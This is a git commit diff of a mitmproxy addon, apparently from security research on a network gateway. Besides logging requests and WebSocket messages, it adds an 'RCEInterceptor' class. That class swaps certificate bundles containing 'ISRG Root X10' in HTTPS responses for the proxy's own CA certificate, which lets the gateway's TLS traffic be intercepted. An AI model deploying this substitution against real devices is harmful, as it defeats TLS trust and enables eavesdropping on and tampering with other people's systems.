77e3cc39333f41b1686c87cab9295045bc3a070a
CSharper63 <gitcommit.ci158@silomails.com>
2024-06-24 14:16:07 +0200

    move log script in mitmproxy folder

--- mitmproxy/log_requests.py
+++ mitmproxy/log_requests.py
@@ -5,7 +5,6 @@ import os
 
 class Logger:
     root = '/home/mitmproxy'
-    ca_cert_path = f'{root}/mitmproxy-ca-cert.pem'
 
     def __init__(self):
         try:
@@ -13,8 +12,7 @@ class Logger:
             self.requests_file_path = f'{self.root}/requests.json'
             self.wss_messages_file_path = f'{self.root}/wss_messages.json'
 
-            # load CA certificate content
-            self.ca_cert_content = self.load_ca_cert_content()
+
 
             # init files if don't exist
             self.init_file(self.requests_file_path)
@@ -29,19 +27,6 @@ class Logger:
 
     def timestamp_now(self):
      return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
-
-    # as ttn seems to provide cert to gateway
-    # this fnct will load it, then will erase on-the-fly response
-    def load_ca_cert_content(self):
-        try:
-            with open(self.ca_cert_path, 'rb') as f:
-                ca_cert_content = f.read()
-                f.close()
-            return ca_cert_content
-        except Exception as e:
-            timestamp = self.timestamp_now()
-            ctx.log.info(f"[{timestamp}] Error loading CA certificate content: {e}")
-            return b''
 
     def init_file(self, filepath):
         # init empty if don't exist
@@ -109,22 +94,49 @@ class Logger:
 
             ctx.log.info(f"[{timestamp}] Logged WebSocket message from {'client' if message.from_client else 'server'}")
 
+    # on obj destruct kill the filestream
+    def __del__(self):
+        self.requests_file.close()
+        self.wss_messages_file.close()
+
+class RCEInterceptor:
+
+    ca_cert_path = '/home/mitmproxy/mitmproxy-ca-cert.pem'
+
+    def __init__(self) -> None:
+        # load CA certificate content
+        self.ca_cert_content = self.load_ca_cert_content()
+
+    # as ttn seems to provide cert to gateway
+    # this fnct will load it, then will erase on-the-fly response
+    def load_ca_cert_content(self):
+        try:
+            with open(self.ca_cert_path, 'rb') as f:
+                ca_cert_content = f.read()
+                f.close()
+            return ca_cert_content
+        except Exception as e:
+            timestamp = self.timestamp_now()
+            ctx.log.info(f"[{timestamp}] Error loading CA certificate content: {e}")
+            return b''
+
+
+    def timestamp_now(self):
+        return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+
     # remove root certif if present in https response
     def response(self, flow: http.HTTPFlow):
         timestamp = self.timestamp_now()
         try:
             if 'content-type' in flow.response.headers:
                 if flow.response.headers['content-type'] == 'application/octet-stream':
+                    # verify the content to check
                     if b'ISRG Root X10' in flow.response.content:
+                        ctx.log.info(f'Content of request before interception: {flow.response.content.hex()}')
                         flow.response.content = self.ca_cert_content
                         ctx.log.info(f"[{self.timestamp_now()}] ISRG Root X10 intercepted and erased")
         except Exception as e:
             ctx.log.info(f"[{timestamp}] Error processing HTTP response: {e}")
 
-    # on obj destruct kill the filestream
-    def __del__(self):
-        self.requests_file.close()
-        self.wss_messages_file.close()
-
 # add the current logger as new addon on mitmproxy
-addons = [Logger()]
+addons = [Logger(), RCEInterceptor()]
